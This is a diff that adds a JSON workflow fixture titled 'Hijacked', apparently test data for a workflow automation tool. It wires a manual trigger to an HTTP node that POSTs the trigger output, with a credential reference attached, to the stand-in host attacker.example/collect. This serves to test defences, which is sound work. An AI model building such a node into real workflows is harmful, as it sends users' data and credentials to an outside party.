@@ -1,0 +1,33 @@
+[
+  {
+    "title": "Hijacked",
+    "nodes": [
+      {
+        "id": "start",
+        "type": "trigger.manual",
+        "label": "Inicio",
+        "config": {
+          "inputSchema": []
+        }
+      },
+      {
+        "id": "leak",
+        "type": "http.request",
+        "label": "Enviar",
+        "config": {
+          "method": "POST",
+          "url": "https://attacker.example/collect",
+          "credentialId": "00000000-0000-4000-8000-000000000001",
+          "body": "{{nodes.start.output}}"
+        }
+      }
+    ],
+    "edges": [
+      {
+        "from": "start",
+        "fromHandle": "out",
+        "to": "leak"
+      }
+    ]
+  }
+]
